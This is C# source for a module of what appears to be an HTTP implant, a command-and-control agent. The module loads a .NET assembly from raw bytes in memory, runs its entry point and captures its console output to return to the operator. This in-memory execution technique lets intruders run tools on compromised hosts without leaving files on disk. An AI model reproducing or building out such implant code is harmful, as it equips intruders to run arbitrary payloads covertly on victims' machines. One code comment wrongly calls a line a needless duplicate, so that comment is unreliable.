using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;

namespace HTTPImplant.Modules
{
    // This static class, ExecuteAssembly, is responsible for executing .NET assembly code.
    public static class ExecuteAssembly
    {
        // This Execute method executes assembly code, which is passed in as a byte array (asm).
        // An array of strings (args) can be optionally supplied as arguments.
        public static string Execute(byte[] asm, string[] args = null)
        {
            // If args is null, initialize an empty string array to avoid null reference exceptions.
            if (args == null) { args = new string[0]; }

            // Store the current Console output and error streams.
            var currentOut = Console.Out;
            var currentError = Console.Error;

            // MemoryStream and StreamWriter are created to capture the Console's output.
            var memoryStream = new MemoryStream();
            var streamWriter = new StreamWriter(memoryStream);

            // Set Console output and error streams to the StreamWriter instance.
            Console.SetOut(streamWriter);
            Console.SetError(streamWriter); // Note: There's a typo here, this line is repeated unnecessarily.

            // Load the .NET assembly from the provided byte array.
            var assembly = Assembly.Load(asm);
            // Invoke the assembly's entry point with the provided args.
            assembly.EntryPoint.Invoke(null, new object[] { args });

            // Ensure all outputs are written to the MemoryStream by flushing the Console streams.
            Console.Out.Flush();
            Console.Error.Flush();

            // Convert the MemoryStream's contents into a UTF8 string, this is the output from the assembly execution.
            var output = Encoding.UTF8.GetString(memoryStream.ToArray());

            // Revert Console output and error streams back to their original states.
            Console.SetOut(currentOut);
            Console.SetError(currentError);

            // Dispose of the StreamWriter and MemoryStream to free resources.
            streamWriter.Dispose();
            memoryStream.Dispose();

            // Return the assembly execution output.
            return output;
        }
    }
}
